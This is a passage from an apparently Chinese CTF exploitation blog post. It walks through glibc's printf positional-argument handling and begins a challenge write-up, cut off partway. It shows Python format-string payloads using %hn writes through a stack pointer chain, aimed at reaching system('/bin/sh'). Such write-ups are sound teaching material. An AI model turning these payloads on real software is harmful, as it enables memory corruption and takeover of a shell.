class=\"meta\">#<span class=\"keyword\">undef</span> T</span></span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((args_type[cnt] &amp; PA_FLAG_PTR) != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t  args_value[cnt].pa_pointer = va_arg (*ap_savep, <span class=\"type\">void</span> *);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (__glibc_unlikely (__printf_va_arg_table != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t &amp;&amp; __printf_va_arg_table[args_type[cnt] - PA_LAST] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    args_value[cnt].pa_user = alloca (args_size[cnt]);</span><br><span class=\"line\">\t    (*__printf_va_arg_table[args_type[cnt] - PA_LAST])</span><br><span class=\"line\">\t      (args_value[cnt].pa_user, ap_savep);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t  <span class=\"built_in\">memset</span> (&amp;args_value[cnt], <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span> (args_value[cnt]));</span><br><span class=\"line\">\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">-1</span>:</span><br><span class=\"line\">\t<span class=\"comment\">/* Error case.  Not all parameters appear in N$ format</span></span><br><span class=\"line\"><span class=\"comment\">\t   strings.  We have no way to determine their type.  */</span></span><br><span class=\"line\">\tassert ((mode_flags &amp; PRINTF_FORTIFY) != <span class=\"number\">0</span>);</span><br><span class=\"line\">\t__libc_fatal (<span class=\"string\">&quot;*** invalid %N$ use detected ***\\n&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Now walk through all format specifiers and process them.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (; (<span class=\"type\">size_t</span>) nspecs_done &lt; nspecs; ++nspecs_done)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      STEP4_TABLE;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"type\">int</span> is_negative;</span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">      &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">int</span> longlong;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">int</span> word;</span><br><span class=\"line\">      &#125; number;</span><br><span class=\"line\">      <span class=\"type\">int</span> base;</span><br><span class=\"line\">      CHAR_T *<span class=\"built_in\">string</span>;\t\t<span class=\"comment\">/* Pointer to argument string.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Fill variables from values in struct.  */</span></span><br><span class=\"line\">      <span class=\"type\">int</span> alt = specs[nspecs_done].info.alt;</span><br><span class=\"line\">      <span class=\"type\">int</span> space = specs[nspecs_done].info.space;</span><br><span class=\"line\">      <span class=\"type\">int</span> left = specs[nspecs_done].info.left;</span><br><span class=\"line\">      <span class=\"type\">int</span> showsign = specs[nspecs_done].info.showsign;</span><br><span class=\"line\">      <span class=\"type\">int</span> group = specs[nspecs_done].info.group;</span><br><span class=\"line\">      <span class=\"type\">int</span> is_long_double __attribute__ ((unused))</span><br><span class=\"line\">\t= specs[nspecs_done].info.is_long_double;</span><br><span class=\"line\">      <span class=\"type\">int</span> is_short = specs[nspecs_done].info.is_short;</span><br><span class=\"line\">      <span class=\"type\">int</span> is_char = specs[nspecs_done].info.is_char;</span><br><span class=\"line\">      <span class=\"type\">int</span> is_long = specs[nspecs_done].info.is_long;</span><br><span class=\"line\">      <span class=\"type\">int</span> width = specs[nspecs_done].info.width;</span><br><span class=\"line\">      <span class=\"type\">int</span> prec = specs[nspecs_done].info.prec;</span><br><span class=\"line\">      <span class=\"type\">int</span> use_outdigits = specs[nspecs_done].info.i18n;</span><br><span class=\"line\">      <span class=\"type\">char</span> pad = specs[nspecs_done].info.pad;</span><br><span class=\"line\">      CHAR_T spec = specs[nspecs_done].info.spec;</span><br><span class=\"line\"></span><br><span class=\"line\">      CHAR_T *workend = work_buffer + WORK_BUFFER_SIZE;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Fill in last information.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (specs[nspecs_done].width_arg != <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"comment\">/* Extract the field width from an argument.  */</span></span><br><span class=\"line\">\t  specs[nspecs_done].info.width =</span><br><span class=\"line\">\t    args_value[specs[nspecs_done].width_arg].pa_int;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (specs[nspecs_done].info.width &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t    <span class=\"comment\">/* If the width value is negative left justification is</span></span><br><span class=\"line\"><span class=\"comment\">\t       selected and the value is taken as being positive.  */</span></span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      specs[nspecs_done].info.width *= <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t      left = specs[nspecs_done].info.left = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t  width = specs[nspecs_done].info.width;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (specs[nspecs_done].prec_arg != <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"comment\">/* Extract the precision from an argument.  */</span></span><br><span class=\"line\">\t  specs[nspecs_done].info.prec =</span><br><span class=\"line\">\t    args_value[specs[nspecs_done].prec_arg].pa_int;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (specs[nspecs_done].info.prec &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t    <span class=\"comment\">/* If the precision is negative the precision is</span></span><br><span class=\"line\"><span class=\"comment\">\t       omitted.  */</span></span><br><span class=\"line\">\t    specs[nspecs_done].info.prec = <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  prec = specs[nspecs_done].info.prec;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Process format specifiers.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"keyword\">extern</span> printf_function **__printf_function_table;</span><br><span class=\"line\">\t  <span class=\"type\">int</span> function_done;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (spec &lt;= UCHAR_MAX</span><br><span class=\"line\">\t      &amp;&amp; __printf_function_table != <span class=\"literal\">NULL</span></span><br><span class=\"line\">\t      &amp;&amp; __printf_function_table[(<span class=\"type\">size_t</span>) spec] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"type\">const</span> <span class=\"type\">void</span> **ptr = alloca (specs[nspecs_done].ndata_args</span><br><span class=\"line\">\t\t\t\t\t * <span class=\"keyword\">sizeof</span> (<span class=\"type\">const</span> <span class=\"type\">void</span> *));</span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"comment\">/* Fill in an array of pointers to the argument values.  */</span></span><br><span class=\"line\">\t      <span class=\"keyword\">for</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; specs[nspecs_done].ndata_args;</span><br><span class=\"line\">\t\t   ++i)</span><br><span class=\"line\">\t\tptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];</span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"comment\">/* Call the function.  */</span></span><br><span class=\"line\">\t      function_done = __printf_function_table[(<span class=\"type\">size_t</span>) spec]</span><br><span class=\"line\">\t\t(s, &amp;specs[nspecs_done].info, ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"keyword\">if</span> (function_done != <span class=\"number\">-2</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t  <span class=\"comment\">/* If an error occurred we don&#x27;t have information</span></span><br><span class=\"line\"><span class=\"comment\">\t\t     about # of chars.  */</span></span><br><span class=\"line\">\t\t  <span class=\"keyword\">if</span> (function_done &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t    &#123;</span><br><span class=\"line\">\t\t      <span class=\"comment\">/* Function has set errno.  */</span></span><br><span class=\"line\">\t\t      done = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t      <span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t\t    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t  done_add (function_done);</span><br><span class=\"line\">\t\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  JUMP (spec, step4_jumps);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_data args_value[specs[nspecs_done].data_arg]</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_int() process_arg_data.pa_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_long_int() process_arg_data.pa_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_long_long_int() process_arg_data.pa_long_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_pointer() process_arg_data.pa_pointer</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_string() process_arg_data.pa_string</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_unsigned_int() process_arg_data.pa_u_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_unsigned_long_int() process_arg_data.pa_u_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_unsigned_long_long_int() process_arg_data.pa_u_long_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_wchar_t() process_arg_data.pa_wchar</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> process_arg_wstring() process_arg_data.pa_wstring</span></span><br><span class=\"line\">\t  process_arg ();</span><br><span class=\"line\">\t  process_string_arg ();</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_data</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_long_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_pointer</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_string</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_unsigned_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_unsigned_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_unsigned_long_long_int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_wchar_t</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> process_arg_wstring</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t  LABEL (form_float):</span><br><span class=\"line\">\t  LABEL (form_floathex):</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    <span class=\"type\">const</span> <span class=\"type\">void</span> *ptr</span><br><span class=\"line\">\t      = (<span class=\"type\">const</span> <span class=\"type\">void</span> *) &amp;args_value[specs[nspecs_done].data_arg];</span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class=\"number\">0</span>))</span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\tspecs[nspecs_done].data_arg_type = PA_DOUBLE;</span><br><span class=\"line\">\t\tspecs[nspecs_done].info.is_long_double = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t      &#125;</span><br><span class=\"line\">\t    SETUP_FLOAT128_INFO (specs[nspecs_done].info);</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"type\">int</span> function_done</span><br><span class=\"line\">\t      = __printf_fp_spec (s, &amp;specs[nspecs_done].info, &amp;ptr);</span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (function_done &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">/* Error in print handler; up to handler to set errno.  */</span></span><br><span class=\"line\">\t\tdone = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t      &#125;</span><br><span class=\"line\">\t    done_add (function_done);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  LABEL (form_unknown):</span><br><span class=\"line\">\t  &#123;</span><br><span class=\"line\">\t    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i;</span><br><span class=\"line\">\t    <span class=\"type\">const</span> <span class=\"type\">void</span> **ptr;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    ptr = alloca (specs[nspecs_done].ndata_args</span><br><span class=\"line\">\t\t\t  * <span class=\"keyword\">sizeof</span> (<span class=\"type\">const</span> <span class=\"type\">void</span> *));</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"comment\">/* Fill in an array of pointers to the argument values.  */</span></span><br><span class=\"line\">\t    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; specs[nspecs_done].ndata_args; ++i)</span><br><span class=\"line\">\t      ptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"comment\">/* Call the function.  */</span></span><br><span class=\"line\">\t    function_done = printf_unknown (s, &amp;specs[nspecs_done].info,</span><br><span class=\"line\">\t\t\t\t\t    ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t    <span class=\"comment\">/* If an error occurred we don&#x27;t have information about #</span></span><br><span class=\"line\"><span class=\"comment\">\t       of chars.  */</span></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (function_done &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">/* Function has set errno.  */</span></span><br><span class=\"line\">\t\tdone = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">\t      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t    done_add (function_done);</span><br><span class=\"line\">\t  &#125;</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Write the following constant string.  */</span></span><br><span class=\"line\">      outstring (specs[nspecs_done].end_of_fmt,</span><br><span class=\"line\">\t\t specs[nspecs_done].next_fmt</span><br><span class=\"line\">\t\t - specs[nspecs_done].end_of_fmt);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> all_done:</span><br><span class=\"line\">  scratch_buffer_free (&amp;argsbuf);</span><br><span class=\"line\">  scratch_buffer_free (&amp;specsbuf);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> done;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"解析流程\"><a href=\"#解析流程\" class=\"headerlink\" title=\"解析流程\"></a>解析流程</h2><h3 id=\"无-“-”符\"><a href=\"#无-“-”符\" class=\"headerlink\" title=\"无 “$”符\"></a>无 “$”符</h3><p>没有”$”符，程序就会在这里跳来跳起，完成全部解析<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250811180756048.png\"></p>\n<p>我们来表中是什么<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250811181243402.png\" alt=\"image.png\"></p>\n<p>关于LABEL (form_number)的源码在上文中有，这里不再赘述。它的功能就顺序往参数里写数据，并且是实时的。</p>\n<p>关于LABEL(unknown)的源码上文也有，功能也就是检测当前字符是否为终止符，是则结束，不是则继续。</p>\n<h3 id=\"有”-”-符\"><a href=\"#有”-”-符\" class=\"headerlink\" title=\"有”$” 符\"></a>有”$” 符</h3><p>在vfprintf的do循环中会获取当前字符，并进行一次跳表的寻找找到对应字符的操作函数，跳转执行。<br>如果遇到<code>$</code>符，或者遇到<code>unknown</code>的字符，就会调用<code>printf_positional</code>,去做复杂的字符串的解析</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">printf_arg</span> *<span class=\"title\">args_value</span>;</span></span><br><span class=\"line\"> <span class=\"type\">int</span> *args_size;</span><br><span class=\"line\"> <span class=\"type\">int</span> *args_type;</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"comment\">/* Calculate total size needed to represent a single argument</span></span><br><span class=\"line\"><span class=\"comment\">      across all three argument-related arrays.  */</span></span><br><span class=\"line\">   <span class=\"type\">size_t</span> bytes_per_arg</span><br><span class=\"line\">     = <span class=\"keyword\">sizeof</span> (*args_value) + <span class=\"keyword\">sizeof</span> (*args_size) + <span class=\"keyword\">sizeof</span> (*args_type);</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!scratch_buffer_set_array_size (&amp;argsbuf, nargs, bytes_per_arg))</span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">done = <span class=\"number\">-1</span>;</span><br><span class=\"line\"><span class=\"keyword\">goto</span> all_done;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">   args_value = argsbuf.data;</span><br><span class=\"line\">   <span class=\"comment\">/* Set up the remaining two arrays to each point past the end of</span></span><br><span class=\"line\"><span class=\"comment\">      the prior array, since space for all three has been allocated</span></span><br><span class=\"line\"><span class=\"comment\">      now.  */</span></span><br><span class=\"line\">   args_size = &amp;args_value[nargs].pa_int;</span><br><span class=\"line\">   args_type = &amp;args_size[nargs];</span><br><span class=\"line\">   <span class=\"built_in\">memset</span> (args_type, (mode_flags &amp; PRINTF_FORTIFY) != <span class=\"number\">0</span> ? <span class=\"string\">&#x27;\\xff&#x27;</span> : <span class=\"string\">&#x27;\\0&#x27;</span>,</span><br><span class=\"line\">    nargs * <span class=\"keyword\">sizeof</span> (*args_type));</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">/* XXX Could do sanity check here: If any element in ARGS_TYPE is</span></span><br><span class=\"line\"><span class=\"comment\">    still zero after this loop, format is invalid.  For now we</span></span><br><span class=\"line\"><span class=\"comment\">    simply use 0 as the value.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">/* Fill in the types of all the arguments.  */</span></span><br><span class=\"line\"> <span class=\"keyword\">for</span> (cnt = <span class=\"number\">0</span>; cnt &lt; nspecs; ++cnt)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     <span class=\"comment\">/* If the width is determined by an argument this is an int.  */</span></span><br><span class=\"line\">     <span class=\"keyword\">if</span> (specs[cnt].width_arg != <span class=\"number\">-1</span>)</span><br><span class=\"line\">args_type[specs[cnt].width_arg] = PA_INT;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">/* If the precision is determined by an argument this is an int.  */</span></span><br><span class=\"line\">     <span class=\"keyword\">if</span> (specs[cnt].prec_arg != <span class=\"number\">-1</span>)</span><br><span class=\"line\">args_type[specs[cnt].prec_arg] = PA_INT;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">switch</span> (specs[cnt].ndata_args)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"number\">0</span>:\t\t<span class=\"comment\">/* No arguments.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"number\">1</span>:\t\t<span class=\"comment\">/* One argument; we already have the</span></span><br><span class=\"line\"><span class=\"comment\">\t\t   type and size.  */</span></span><br><span class=\"line\">  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;</span><br><span class=\"line\">  args_size[specs[cnt].data_arg] = specs[cnt].size;</span><br><span class=\"line\">  <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">  <span class=\"comment\">/* We have more than one argument for this format spec.</span></span><br><span class=\"line\"><span class=\"comment\">     We must call the arginfo function again to determine</span></span><br><span class=\"line\"><span class=\"comment\">     all the types.  */</span></span><br><span class=\"line\">  (<span class=\"type\">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class=\"line\">    (&amp;specs[cnt].info,</span><br><span class=\"line\">     specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class=\"line\">     &amp;args_size[specs[cnt].data_arg]);</span><br><span class=\"line\">  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>在这段代码中，<code>printf_positional</code> 把相关的参数 保存成了副本。后续对格式化字符串的参数处理，都是通过副本做处理。<br>所以说，以第一个<code>$</code>符或者<code>unknown</code>的字符为界，前面通过<code>vfprintf_internal</code> 解析处理，后面通过<code>printf_positional</code>处理。</p>\n<h3 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h3><p>如果我们想一次格式化字符串去栈上做任意地址写，需要利用这个特性。假设我们有一个非栈上格式化字符串的机会，栈上存在如下数据：<br>$$<br>\\begin{flalign*}<br>A &amp;&#x3D;&gt; B &#x3D;&gt; C &amp; \\\\<br>B &amp;&#x3D;&gt; C &amp; \\\\<br>&amp;\\ldots &amp; \\\\<br>D &amp;&#x3D;&gt; E &amp;<br>\\end{flalign*}<br>$$<br>如果我们需要修改<code>D</code>的值为<code>F</code>, 那么我们必须先把<code>B</code> 的值改<code>D</code>，然后在通过B这个偏移去修改。 假设A 的偏移为8，<br>这部分<code>fmt</code> 就是 :</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">b&quot;%p&quot;</span>*<span class=\"number\">6</span></span><br><span class=\"line\">payload1 += <span class=\"string\">&quot;%&#123;&#125;c%hn&quot;</span>.<span class=\"built_in\">format</span>(D_low-<span class=\"number\">60</span>).encode()</span><br><span class=\"line\">payload1 += <span class=\"string\">&quot;%&#123;&#125;c%9$hn&quot;</span>.<span class=\"built_in\">format</span>(E_low-D_low+<span class=\"number\">60</span>).encode()</span><br><span class=\"line\"><span class=\"comment\"># 如果用$符写，当然不能这么用，因为会使第二次写入失败</span></span><br><span class=\"line\"><span class=\"comment\"># 以下是反面教材，属于想得很美</span></span><br><span class=\"line\">payload2 = <span class=\"string\">&quot;%&#123;&#125;c%8$hn&quot;</span>.<span class=\"built_in\">format</span>(D_low).encode()</span><br><span class=\"line\">payload2 += <span class=\"string\">&quot;%&#123;&#125;c%9$hn&quot;</span>.<span class=\"built_in\">format</span>(E_low-D_low).encode()</span><br></pre></td></tr></table></figure>\n\n<p>根据上文的介绍，我们不难理解，printf 在处理这些字符串其实是按顺序来的。第一个<code>%n</code>两个payload都是可以修改成功的，但是第二个<code>%n</code> payload2 是 写不上的。或者说它其实是往<code>C</code>中写了数据。<br>因为<code>$</code>符，让payload2 在第一个<code>%n</code>处就已经把所有的参数都固定了，修改后，栈上是变量，但是后续的写入，不会同步这个变化。而payload1是在第二个 <code>%n</code> 才固定参数，这个时候，第9个参数已经变了，所以可以写成功。</p>\n<h1 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>一个平常的下午，学妹让我帮忙看看题。起初我不以为意，吃完晚饭才开始看。然后就写到了1点钟。感觉自己的思路还是太丑陋，不优雅。于是想起了一个格式化字符串的极限利用。<br><a href=\"https://zikh26.github.io/posts/a523e26a.html#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4\">一次有趣的格式化字符串漏洞利用 | ZIKH26’s Blog</a><br>开始研究</p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数\"><a href=\"#main函数\" class=\"headerlink\" title=\"main函数\"></a>main函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810223742657.png\" alt=\"main函数\"></p>\n<p>功能非常的简单，</p>\n<ol>\n<li>循环3次调用talk，需要控制flag的值（后续再看）</li>\n<li>atk判断，成功则调用he()</li>\n</ol>\n<p>先看he()里有啥。</p>\n<h3 id=\"he函数\"><a href=\"#he函数\" class=\"headerlink\" title=\"he函数\"></a>he函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224024236.png\" alt=\"he函数\"></p>\n<p>这里建议看汇编，</p>\n<ol>\n<li>system的出现，让人思路开朗</li>\n<li>command是<code>-0xe</code>，也就是要控制<code>rbp-0xe</code></li>\n<li>注意lea 和 mov 的区别，通过这个方法的话，必须要把”&#x2F;bin&#x2F;sh”写在栈上</li>\n</ol>\n<p>一般揣测一下出题人的想法，肯定是最后要返回到这里了。</p>\n<h3 id=\"talk函数\"><a href=\"#talk函数\" class=\"headerlink\" title=\"talk函数\"></a>talk函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224845139.png\" alt=\"talk\"></p>\n<p>重点来了，</p>\n<ol>\n<li>非栈上格式化字符串,每次只读0x20字节</li>\n<li>flag初始是0,talk会把它变成1,想办法置0</li>\n<li>返回到了my_read,继续追踪</li>\n</ol>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225109891.png\" alt=\"my_read\"></p>\n<p>看看bss段上,这些变量的位置</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225315432.png\" alt=\"bss\"></p>\n<p>atk在flag上面,那么就可以利用my_read把flag设置成0 ,只要每次都输入8字节就可以.</p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" 